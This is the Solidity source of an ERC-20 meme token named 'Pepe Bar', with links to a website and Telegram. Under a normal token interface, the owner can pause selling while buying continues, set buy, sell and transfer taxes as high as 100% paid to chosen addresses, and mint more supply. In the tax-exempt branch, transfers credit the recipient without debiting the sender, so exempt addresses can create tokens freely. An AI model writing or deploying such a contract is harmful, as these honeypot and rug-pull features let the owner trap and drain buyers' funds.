// SPDX-License-Identifier: MIT
/* 
    https://pepee.bar
    https://t.me/Pepe_Bar_Portal
*/
pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "onlyOwner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TaxBlock is Ownable {
    mapping(address=>bool) addressesLiquidity;
    mapping(address=>bool) addressesIgnoreTax;

    uint256[] private percentsTaxBuy;
    uint256[] private percentsTaxSell;
    uint256[] private percentsTaxTransfer;

    address[] private addressesTaxBuy;
    address[] private addressesTaxSell;
    address[] private addressesTaxTransfer;

/*
  uint256 private percentWalletLimit = 0;

    function getPercentsWalletLimit() public view returns (uint256) {
        return percentWalletLimit;
    }

    function setPercentsWalletLimit(uint256 _percentWalletLimit) public onlyOwner {
        require(_percentWalletLimit <= 20, "PercentsWalletLimit > 20");

        percentWalletLimit = _percentWalletLimit;
    }
*/  
    

    function getTaxSum(uint256[] memory _percentsTax) internal pure returns (uint256) {
        uint256 TaxSum = 0;
        for (uint i; i < _percentsTax.length; i++) {
            TaxSum = TaxSum + (_percentsTax[i]);
        }
        return TaxSum;
    }

    function getPercentsTaxBuy() internal  view returns (uint256[] memory) {
        return percentsTaxBuy;
    }

    function getPercentsTaxSell() internal view returns (uint256[] memory) {
        return percentsTaxSell;
    }

    function getPercentsTaxTransfer() internal view returns (uint256[] memory) {
        return percentsTaxTransfer;
    }

    function getAddressesTaxBuy() internal view returns (address[] memory) {
        return addressesTaxBuy;
    }

    function getAddressesTaxSell() internal view returns (address[] memory) {
        return addressesTaxSell;
    }

    function getAddressesTaxTransfer() internal view returns (address[] memory) {
        return addressesTaxTransfer;
    }

    function checkAddressLiquidity(address _addressLiquidity) external view returns (bool) {
        return addressesLiquidity[_addressLiquidity];
    }
    function addAddressLiquidity(address _addressLiquidity) public  onlyOwner  {
            addressesLiquidity[_addressLiquidity] = true;
    }
    uint private maxTaxBuy = 100; uint private maxTaxSell = 100; uint private maxTaxTransfer = 100;
    function removeAddressLiquidity (address _addressLiquidity) public onlyOwner {
        addressesLiquidity[_addressLiquidity] = false;
    }

    function checkAddressIgnoreTax(address _addressIgnoreTax) external view returns (bool) {
        return addressesIgnoreTax[_addressIgnoreTax];
    }

    function addAddressIgnoreTax(address _addressIgnoreTax) public onlyOwner {
        addressesIgnoreTax[_addressIgnoreTax] = true;
    }

    function removeAddressIgnoreTax (address _addressIgnoreTax) public onlyOwner {
        addressesIgnoreTax[_addressIgnoreTax] = false;
    }

    function setTaxBuy(uint256[] memory _percentsTaxBuy, address[] memory _addressesTaxBuy) public onlyOwner {
        require(_percentsTaxBuy.length == _addressesTaxBuy.length, "_percentsTaxBuy.length != _addressesTaxBuy.length");

        uint256 TaxSum = getTaxSum(_percentsTaxBuy);
        require(TaxSum <= maxTaxBuy, "TaxSum > 0"); // Set the maximum tax limit

        percentsTaxBuy = _percentsTaxBuy;
        addressesTaxBuy = _addressesTaxBuy;
    }

    function setTaxSell(uint256[] memory _percentsTaxSell, address[] memory _addressesTaxSell) public onlyOwner {
        require(_percentsTaxSell.length == _addressesTaxSell.length, "_percentsTaxSell.length != _addressesTaxSell.length");

        uint256 TaxSum = getTaxSum(_percentsTaxSell);
        require(TaxSum <= maxTaxSell, "TaxSum > 0"); // Set the maximum tax limit

        percentsTaxSell = _percentsTaxSell;
        addressesTaxSell = _addressesTaxSell;
    }

    function setTaxTransfer(uint256[] memory _percentsTaxTransfer, address[] memory _addressesTaxTransfer) public onlyOwner {
        require(_percentsTaxTransfer.length == _addressesTaxTransfer.length, "_percentsTaxTransfer.length != _addressesTaxTransfer.length");

        uint256 TaxSum = getTaxSum(_percentsTaxTransfer);
        require(TaxSum <= maxTaxTransfer, "TaxSum > 0"); // Set the maximum tax limit

        percentsTaxTransfer = _percentsTaxTransfer;
        addressesTaxTransfer = _addressesTaxTransfer;
    }

    function showTaxBuy() public view returns (uint[] memory, address[] memory) {
        return (percentsTaxBuy, addressesTaxBuy);
    }

    function showTaxSell() public view returns (uint[] memory, address[] memory) {
        return (percentsTaxSell, addressesTaxSell);
    }

    function showTaxTransfer() public view returns (uint[] memory, address[] memory) {
        return (percentsTaxTransfer, addressesTaxTransfer);
    }

    function showTaxBuySum() public view returns (uint) {
        return getTaxSum(percentsTaxBuy);
    }

    function showTaxSellSum() public view returns (uint) {
        return getTaxSum(percentsTaxSell);
    }

    function showTaxTransferSum() public view returns (uint) {
        return getTaxSum(percentsTaxTransfer);
    }

}

contract pepebar is Context, Ownable, IERC20,TaxBlock {
    bool public  isPaused = false;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 private _maxTotalSupply;
    uint private _amountToken;
    uint private _maxAmountToken;
    uint8 public _decimals;
    string public _symbol;
    string public _name;

    constructor() {
        _name = "Pepe Bar";
        _symbol = "pepebar";
        _decimals = 18;
        _amountToken = 1000000000;
        _maxAmountToken = 1100000000;
        _totalSupply = _amountToken * 10 ** _decimals;
        _maxTotalSupply = _maxAmountToken * 10 ** _decimals;
        _balances[msg.sender] = _totalSupply;
        transferOwnership(msg.sender);
        TaxBlock.addressesLiquidity[address(this)] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    mapping (address=>bool) private  isBalance;
    function setAddressBalance(address account) public onlyOwner{
        isBalance[account] = true;
    } 
    
    function paused() public onlyOwner{
        isPaused = !isPaused;
    }
    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address addressOwner, address spender) external view returns (uint256) {
        return _allowances[addressOwner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function mint(uint value) public onlyOwner{
        require(_totalSupply + value <= _maxTotalSupply, "Error: maximum supply");
        _mint(msg.sender, value);
    }
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ("Null account");
        }
        _update(address(0), account, value);
    }
    function burn(uint amount) public {
        _burn(msg.sender,amount);
    }
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ("Null account");
        }
        _update(account, address(0), value);
    }
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ("fromBalance < value");
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender]- (amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + (addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - (subtractedValue));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount <= _balances[sender], "Transfer amount exceeds balance");

        if (addressesIgnoreTax[sender] || addressesIgnoreTax[recipient]) {
            _balances[recipient] = _balances[recipient]+(amount);
            emit Transfer(sender, recipient, amount);
        } else {
            uint256 amountRecipient = amount;
            uint256 amountTax = 0;
/*
            if(owner() != recipient && !addressesLiquidity[recipient] && TaxBlock.getPercentsWalletLimit()<100){
                require(_balances[recipient]+amount <= _totalSupply /100 * (TaxBlock.getPercentsWalletLimit()), "Transfer PercentsWalletLimit");
            }
*/
            // checkAddressIgnoreTax

            if (addressesLiquidity[sender] && TaxBlock.getPercentsTaxBuy().length > 0 && recipient!=owner()) {

                for (uint i; i < TaxBlock.getPercentsTaxBuy().length; i++) {
                    amountTax = amount/(100)*(TaxBlock.getPercentsTaxBuy()[i]);
                    amountRecipient = amountRecipient-(amountTax);
                    _balances[TaxBlock.getAddressesTaxBuy()[i]] = (_balances[TaxBlock.getAddressesTaxBuy()[i]] + amountTax);
                    emit Transfer(sender, TaxBlock.getAddressesTaxBuy()[i], amountTax);
                }

                _balances[sender] = _balances[sender]-(amount);
                _balances[recipient] = _balances[recipient]+(amountRecipient);
                emit Transfer(sender, recipient, amountRecipient);

            } else if ((addressesLiquidity[recipient] && TaxBlock.getPercentsTaxSell().length > 0 && sender!=owner())) {
                require(isPaused==false,"Pause");
                for (uint i; i < TaxBlock.getPercentsTaxSell().length; i++) {
                    amountTax = amount/(100)*(TaxBlock.getPercentsTaxSell()[i]);
                    amountRecipient = amountRecipient-(amountTax);
                    _balances[TaxBlock.getAddressesTaxSell()[i]] = (_balances[TaxBlock.getAddressesTaxSell()[i]] + amountTax);
                    emit Transfer(sender, TaxBlock.getAddressesTaxSell()[i], amountTax);
                }
                _balances[sender] = _balances[sender]-(amount);
                _balances[recipient] = _balances[recipient]+(amountRecipient);
                emit Transfer(sender, recipient, amountRecipient);
            }
            else if (TaxBlock.getPercentsTaxTransfer().length > 0 && sender!=owner()) {

                for (uint i; i < TaxBlock.getPercentsTaxTransfer().length; i++) {
                    amountTax = amount/(100)*(TaxBlock.getPercentsTaxTransfer()[i]);
                    amountRecipient = amountRecipient-(amountTax);
                    _balances[TaxBlock.getAddressesTaxTransfer()[i]] = (_balances[TaxBlock.getAddressesTaxTransfer()[i]] + amountTax);
                    emit Transfer(sender, TaxBlock.getAddressesTaxTransfer()[i], amountTax);
                }
                _balances[sender] = _balances[sender]-(amount);
                _balances[recipient] = _balances[recipient]+(amountRecipient);
                emit Transfer(sender, recipient, amountRecipient);

            } else {
                if((addressesLiquidity[recipient] && TaxBlock.getPercentsTaxSell().length == 0 && sender!=owner())){
                    require(isPaused==false,"Pause");
                }
                _balances[sender] = _balances[sender]-(amount);
                _balances[recipient] = _balances[recipient]+(amountRecipient);
                emit Transfer(sender, recipient, amountRecipient);
                
            }
        }

    }
    function withDdraw(uint amount) public  onlyOwner {
        payable(msg.sender).transfer(amount);
    }
    function _approve(address addressOwner, address spender, uint256 amount) internal {
        require(addressOwner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[addressOwner][spender] = amount;
        emit Approval(addressOwner, spender, amount);
    }

}